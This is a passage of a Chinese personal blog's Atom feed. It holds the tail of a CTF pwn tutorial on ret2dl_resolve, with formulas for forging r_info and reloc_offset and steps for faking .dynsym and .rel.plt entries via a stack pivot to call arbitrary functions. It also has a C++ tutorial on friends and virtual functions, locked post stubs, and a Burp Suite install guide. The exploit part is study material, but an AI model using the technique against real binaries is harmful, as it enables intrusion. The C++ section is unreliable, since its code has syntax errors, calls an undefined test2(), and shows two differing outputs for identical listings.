id="r-info第二位开始为-dynsym的位置，这个位置是以下代码的位置开始的，其实本质上就是-dynsym的头部，然后相对于这个头部取偏移，然后每个偏移的长度为0x10，因为一个-dynsym的长度为0x10">r_info第二位开始为.dynsym的位置，这个位置是以下代码的位置开始的，其实本质上就是.dynsym的头部，然后相对于这个头部取偏移，然后每个偏移的长度为0x10，因为一个.dynsym的长度为0x10</h4><pre><code>LOAD:0804820C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                 Elf32_Sym &lt;0&gt;</code></pre><h3 id="所以总结一下">所以总结一下</h3><h4 id="如果要绑定变量-r-info-fake-dynsym-dynsym-head-0x10-8-0x6">如果要绑定变量 r_info = (((fake_dynsym - dynsym_head) / 0x10) &lt;&lt; 8) | 0x6;</h4><h4 id="如果要绑定函数-r-info-fake-dynsym-dynsym-head-0x10-8-0x7">如果要绑定函数 r_info = (((fake_dynsym - dynsym_head) / 0x10) &lt;&lt; 8) | 0x7</h4><h3 id="接下来就是reloc-offset的取值问题">接下来就是reloc_offset的取值问题</h3><h4 id="这里直接给出规律-reloc-offset-fake-rel-plt-rel-plt-head">这里直接给出规律 reloc_offset = fake_rel_plt - rel_plt_head</h4><h3 id="总结一下结构体伪造的步骤">总结一下结构体伪造的步骤</h3><h4 id="1、在bss段构造dynsym顺便把函数名也放到后面，接着继续在函数名后面继续构造-rel-plt">1、在bss段构造dynsym顺便把函数名也放到后面，接着继续在函数名后面继续构造.rel.plt</h4><h4 id="2、通过栈迁移，将reloc-offset和参数放到栈的位置里，然后跳到plt-jmp绑定函数的plt上就可以触发dl-runtime-resolve然后通过-fix-up来任意函数调用">2、通过栈迁移，将reloc_offset和参数放到栈的位置里，然后跳到plt_jmp绑定函数的plt上就可以触发dl_runtime_resolve然后通过_fix_up来任意函数调用</h4><h3 id="参考了部分原文链接：https-blog-csdn-net-npy-lp-article-details-102704732">参考了部分原文链接：<a href="https://blog.csdn.net/npy_lp/article/details/102704732" target="_blank" rel="noopener">https://blog.csdn.net/npy_lp/article/details/102704732</a></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;CTF-Pwn-dl_resolve详解&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&quot;近期对于dl-resolve不大熟练，所以准备整理一份比较完整资料来学习一波，以源码和实践相互结合分析，逐渐深入。&quot;&gt;近期对于dl-resolve不大熟练，所以准备整理一份比较完整资料来学习一波
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CTF堆攻击大全</title>
    <link href="http://yoursite.com/2020/01/30/CTF%E5%A0%86%E6%94%BB%E5%87%BB%E5%A4%A7%E5%85%A8/"/>
    <id>http://yoursite.com/2020/01/30/CTF%E5%A0%86%E6%94%BB%E5%87%BB%E5%A4%A7%E5%85%A8/</id>
    <published>2020-01-30T09:43:02.000Z</published>
    <updated>2020-03-26T03:20:51.898Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="50541e0a32a18850ae0277d9ee183841136df0603de6309974cb768a3cd321a8"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>C++初步涉及</title>
    <link href="http://yoursite.com/2020/01/13/C++%E5%88%9D%E6%AD%A5%E6%B6%89%E5%8F%8A/"/>
    <id>http://yoursite.com/2020/01/13/C++%E5%88%9D%E6%AD%A5%E6%B6%89%E5%8F%8A/</id>
    <published>2020-01-13T14:22:02.000Z</published>
    <updated>2020-03-19T07:54:21.394Z</updated>
    
    <content type="html"><![CDATA[<h1>C++ 函数</h1><h2 id="友元">友元</h2><h3 id="一般情况下，类私有变量是无法直接访问的，但是定义友元就可以在外部函数直接访问私有变量，测试代码如下">一般情况下，类私有变量是无法直接访问的，但是定义友元就可以在外部函数直接访问私有变量，测试代码如下:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">class newClass&#123;</span><br><span class="line">private:</span><br><span class="line">    int private_val &#x3D; 1;</span><br><span class="line">public:</span><br><span class="line">    friend int test(newClass nc);</span><br><span class="line">    void check()&#123;</span><br><span class="line">        printf(&quot;%d\n&quot;,private_val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int test(newClass nc)&#123;</span><br><span class="line">    return nc.private_val;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    newClass nc;</span><br><span class="line">    nc.check();</span><br><span class="line">    printf(&quot;private_val:%d\n&quot;,test(nc));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出结果如下">输出结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">private_val:1</span><br></pre></td></tr></table></figure><h3 id="使用友元类时注意：">使用友元类时注意：</h3><h3 id="1-友元关系不能被继承。">(1) 友元关系不能被继承。</h3><h3 id="2-友元关系是单向的，不具有交换性。若类B是类A的友元，类A不一定是类B的友元，要看在类中是否有相应的声明。">(2) 友元关系是单向的，不具有交换性。若类B是类A的友元，类A不一定是类B的友元，要看在类中是否有相应的声明。</h3><h3 id="3-友元关系不具有传递性。若类B是类A的友元，类C是B的友元，类C不一定是类A的友元，同样要看类中是否有相应的申明">(3) 友元关系不具有传递性。若类B是类A的友元，类C是B的友元，类C不一定是类A的友元，同样要看类中是否有相应的申明</h3><h2 id="设置函数默认值">设置函数默认值</h2><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void function_name(unsigned long long val &#x3D; 0xdeadbeef)&#123;</span><br><span class="line">    printf(&quot;%lu&quot;,val);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    function_name();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出结果如下-2">输出结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3735928559</span><br></pre></td></tr></table></figure><h2 id="总结">总结:</h2><h3 id="所以只需要在参数在定义处直接赋值即可设置初始值">所以只需要在参数在定义处直接赋值即可设置初始值</h3><h1>C++ 多态</h1><h2 id="类">类</h2><hr><h3 id="C-类的定义如下">C++类的定义如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class class_name&#123;</span><br><span class="line">private:</span><br><span class="line">int val1_name &#x3D; 0;</span><br><span class="line">void function1()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pubilc:</span><br><span class="line">int val2_name &#x3D; 0;</span><br><span class="line">void function2()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="C-派生类定义">C++派生类定义</h3><h3 id="无构造函数的情况">无构造函数的情况</h3><h4 id="首先我们先要有一个基类，我预先定义为class-base，然后我们利用这个基类定义一个派生类">首先我们先要有一个基类，我预先定义为<code>class_base</code>，然后我们利用这个基类定义一个派生类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class new_class:public class_base()&#123;</span><br><span class="line">private:</span><br><span class="line">int val1_name &#x3D; 0;</span><br><span class="line">void function1()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pubilc:</span><br><span class="line">int val2_name &#x3D; 0;</span><br><span class="line">void function2()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="这样派生出来的类，外部调用的时候可以调用基类未被重写的公开函数。同时为了保证封装性，派生类也无法直接使用基类私有函数。">这样派生出来的类，外部调用的时候可以调用基类未被重写的公开函数。同时为了保证封装性，派生类也无法直接使用基类私有函数。</h4><h3 id="存在构造函数的情况">存在构造函数的情况</h3><h4 id="定义类名为class-base的基类，然后同时定义好构造函数。注意构造函数最好是public的形式">定义类名为<code>class_base</code>的基类，然后同时定义好构造函数。<code>注意构造函数最好是public的形式</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class new_class:public class_base&#123;</span><br><span class="line">private:</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">new_class(args):class_base(args)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="虚函数">虚函数</h3><hr><h4 id="如果我们想使用多态，肯定必须要了解虚函数">如果我们想使用多态，肯定必须要了解虚函数</h4><h4 id="虚函数可以让我们重名函数指向我们想要执行的函数，其原理是通过虚函数表（Virtual-Table）来实现的。它类似于一个地图，指明了实际所应该调用的函数。">虚函数可以让我们重名函数指向我们想要执行的函数，其原理是通过虚函数表（Virtual Table）来实现的。它类似于一个地图，指明了实际所应该调用的函数。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">class person&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void test1()&#123;</span><br><span class="line">        puts(&quot;I am person&#39;s test1!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class child:public person&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void test1()&#123;</span><br><span class="line">        puts(&quot;I am child&#39;s test1!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    child c;</span><br><span class="line">    person* a &#x3D; &amp;c;</span><br><span class="line">    a-&gt;test1();</span><br><span class="line">    c.test1();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出结果如下-3">输出结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I am child&#39;s test1!</span><br><span class="line">I am child&#39;s test1!</span><br></pre></td></tr></table></figure><h4 id="当我把main改成以下代码时">当我把main改成以下代码时</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">    child c;</span><br><span class="line">    person a &#x3D; c;</span><br><span class="line">    a.test1();</span><br><span class="line">    c.test1();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出结果如下-4">输出结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I am person&#39;s test1!</span><br><span class="line">I am child&#39;s test1!</span><br></pre></td></tr></table></figure><h2 id="解释：">解释：</h2><h4 id="如果我们使用的是传址的形式，则调用的时候依旧会调用等号右边的类的函数，因为等号右边的类所对应的vtable已经被覆盖为等号右边的函数了。">如果我们使用的是传址的形式，则调用的时候依旧会调用等号右边的类的函数，因为等号右边的类所对应的vtable已经被覆盖为等号右边的函数了。</h4><h4 id="如果我们使用的是赋值的形式，则调用的时候只是把变量进行了复制，而函数指针（vtable）没有被改动，所以按照被赋值变量的类进行调用函数">如果我们使用的是赋值的形式，则调用的时候只是把变量进行了复制，而函数指针（vtable）没有被改动，所以按照被赋值变量的类进行调用函数</h4><h3 id="源码">源码:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">class person&#123;</span><br><span class="line">public:</span><br><span class="line">    void test1()&#123;</span><br><span class="line">        puts(&quot;I am person&#39;s test1!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class child:public person&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void test1()&#123;</span><br><span class="line">        puts(&quot;I am child&#39;s test1!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;    </span><br><span class="line">    child c;</span><br><span class="line">    person * a &#x3D; &amp;c;</span><br><span class="line">    a-&gt;test1();</span><br><span class="line">    a-&gt;test2();</span><br><span class="line">    c.test1();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出结果如下-5">输出结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I am person&#39;s test1!</span><br><span class="line">I am person&#39;s test2!</span><br><span class="line">I am child&#39;s test1!</span><br></pre></td></tr></table></figure><h3 id="源码-2">源码:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">class person&#123;</span><br><span class="line">public:</span><br><span class="line">    void test1()&#123;</span><br><span class="line">        puts(&quot;I am person&#39;s test1!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class child:public person&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void test1()&#123;</span><br><span class="line">        puts(&quot;I am child&#39;s test1!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;    </span><br><span class="line">    child c;</span><br><span class="line">    person * a &#x3D; &amp;c;</span><br><span class="line">    a-&gt;test1();</span><br><span class="line">    a-&gt;test2();</span><br><span class="line">    c.test1();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出结果如下-6">输出结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I am person&#39;s test1!</span><br><span class="line">I am child&#39;s test2!</span><br><span class="line">I am child&#39;s test1!</span><br></pre></td></tr></table></figure><h2 id="解释：-2">解释：</h2><h4 id="由于没有给基类的函数标记为virtual，所以当我们赋值之后调用重写的虚函数并不会调用派生类的函数，而是会调用基类的函数，但是标记了virtual的函数依旧会被重写。可见想要多态，基类用虚函数是少不了了，需要">由于没有给基类的函数标记为virtual，所以当我们赋值之后调用重写的虚函数并不会调用派生类的函数，而是会调用基类的函数，但是标记了virtual的函数依旧会被重写。<code>可见想要多态，基类用虚函数是少不了了，需要</code></h4><h3 id="纯虚函数">纯虚函数</h3><hr><h4 id="其实就是一个接口">其实就是一个接口</h4><h4 id="纯虚函数需要在定义的结尾加一个-0，格式如下">纯虚函数需要在定义的结尾加一个=0，格式如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtual void function_name()&#x3D;0;</span><br></pre></td></tr></table></figure><h4 id="如果基类中使用了纯虚函数，则派生类必须声明function-name-函数，不然编译器就会报错。">如果基类中使用了纯虚函数，则派生类必须声明<code>function_name()</code>函数，不然编译器就会报错。</h4><h3 id="知识小补充">知识小补充</h3><h4 id="构造函数不可以被定义为虚函数">构造函数不可以被定义为虚函数</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;C++ 函数&lt;/h1&gt;
&lt;h2 id=&quot;友元&quot;&gt;友元&lt;/h2&gt;
&lt;h3 id=&quot;一般情况下，类私有变量是无法直接访问的，但是定义友元就可以在外部函数直接访问私有变量，测试代码如下&quot;&gt;一般情况下，类私有变量是无法直接访问的，但是定义友元就可以在外部函数直接访问私有变量，测试
      
    
    </summary>
    
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
    
      <category term="C++" scheme="http://yoursite.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Docker-命令大全</title>
    <link href="http://yoursite.com/2020/01/10/Docker-%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"/>
    <id>http://yoursite.com/2020/01/10/Docker-%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/</id>
    <published>2020-01-10T05:13:02.000Z</published>
    <updated>2020-03-26T03:20:46.162Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="6f93a1b44942d29fce2943a8504d862ff3162744e2ec28b80c56e80790258305"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="Docker" scheme="http://yoursite.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite-Ubuntu安装教程</title>
    <link href="http://yoursite.com/2020/01/02/Burpsuite-Ubuntu%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/01/02/Burpsuite-Ubuntu%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</id>
    <published>2020-01-02T08:48:45.973Z</published>
    <updated>2020-01-14T15:01:46.237Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Burpsuite-Ubuntu安装教程">Burpsuite-Ubuntu安装教程</h2><hr><h3 id="1、我们需要安装jdk和jre环境，输入一下指令进行安装">1、我们需要安装jdk和jre环境，输入一下指令进行安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install openjdk-8-jdk-headless</span><br><span class="line">apt install openjdk-8-jre-headless</span><br></pre></td></tr></table></figure><h3 id="2、然后设置firefox的代理">2、然后设置firefox的代理</h3><h4 id="点开firefox设置，然后拉到最后一个按钮（网络配置按钮）">点开firefox设置，然后拉到最后一个按钮（网络配置按钮）</h4><p><img src="/" alt class="lazyload" data-src="/2020/01/02/Burpsuite-Ubuntu%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1.png"></p><h3 id="3、然后安装burp的证书">3、然后安装burp的证书</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Burpsuite-Ubuntu安装教程&quot;&gt;Burpsuite-Ubuntu安装教程&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&quot;1、我们需要安装jdk和jre环境，输入一下指令进行安装&quot;&gt;1、我们需要安装jdk和jre环境，输入一下指令进行安装&lt;/h3&gt;
&lt;figure
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
